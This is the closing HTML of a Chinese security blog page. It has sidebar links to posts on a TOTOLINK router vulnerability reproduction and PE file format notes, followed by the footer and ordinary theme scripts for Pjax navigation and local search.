href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
